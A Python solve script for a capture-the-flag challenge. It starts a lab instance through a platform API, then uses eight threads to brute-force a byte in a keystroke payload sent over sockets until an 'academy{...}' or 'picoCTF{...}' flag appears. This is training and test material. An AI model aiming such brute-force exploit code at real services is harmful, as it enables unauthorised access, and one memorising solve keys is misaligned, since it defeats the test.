import sys, json, re, time, socket, threading, queue
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

CID = 346
cy = CyLab(delay=1.5)
cy.login()
state = {"host": None}
lock = threading.Lock()


def start_instance():
    cy.req("PUT", f"/api/challenges/{CID}/instance/?source=library")
    for _ in range(12):
        time.sleep(3)
        st, b = cy.req("GET", f"/api/challenges/{CID}/instance/")
        d = json.loads(b)
        txt = d.get("description") or ""
        m = re.search(r"nc`?\s*`?([A-Za-z0-9.\-]+)\s+(\d{2,5})", txt)
        if m and d.get("status") == "RUNNING":
            return (m.group(1), int(m.group(2)))
    return None


host = start_instance()
print("HOST", host, flush=True)
if not host:
    raise SystemExit(1)
state["host"] = host

VALUES = list(range(0x20, 0x7f))
OFFSET = int(sys.argv[1]) if len(sys.argv) > 1 else -40
work = queue.Queue()
for v in VALUES:
    work.put(v)
found = []


def attempt(host_, v):
    y = OFFSET + 90
    keys = bytearray(b"l" + bytes([v]))
    keys += b"w" * 4
    keys += (b"d" * (y - 4)) if y >= 4 else (b"a" * (4 - y))
    keys += b"w"
    line = bytes(keys) + b"\n"
    s = socket.create_connection(host_, timeout=15)
    s.settimeout(1.0)
    try:
        time.sleep(0.3)
        buf = b""
        t0 = time.time(); last = time.time()
        while time.time() - t0 < 6:
            try:
                d = s.recv(65536)
            except socket.timeout:
                if time.time() - last > 0.7:
                    break
                continue
            if not d:
                break
            buf += d; last = time.time()
        s.sendall(line)
        out = b""
        t0 = time.time(); last = time.time()
        while time.time() - t0 < 55:
            try:
                d = s.recv(65536)
            except socket.timeout:
                if time.time() - last > 4:
                    break
                continue
            if not d:
                break
            out += d; last = time.time()
            if b"academy{" in out:
                break
        m = re.search(rb"(academy|picoCTF)\{[^}]{1,120}\}", buf + out)
        return m.group(0).decode() if m else None
    finally:
        try:
            s.close()
        except Exception:
            pass


def worker():
    while True:
        try:
            v = work.get_nowait()
        except queue.Empty:
            return
        h = state["host"]
        try:
            r = attempt(h, v)
        except Exception as e:
            print("err %#04x %s" % (v, type(e).__name__), flush=True)
            # maybe instance dead: refresh
            try:
                nh = start_instance()
                if nh:
                    with lock:
                        state["host"] = nh
                    print("restart ->", nh, flush=True)
            except Exception:
                pass
            continue
        if r:
            with lock:
                found.append((v, r))
                print("FOUND tile=%#04x -> %s" % (v, r), flush=True)
                open(r"./_z_bg2_flag.txt", "w").write(r)
        else:
            print("miss %#04x" % v, flush=True)


threads = [threading.Thread(target=worker, daemon=True) for _ in range(8)]
t0 = time.time()
for t in threads:
    t.start()
for t in threads:
    t.join()
print("done %.0fs found=%r" % (time.time() - t0, found), flush=True)
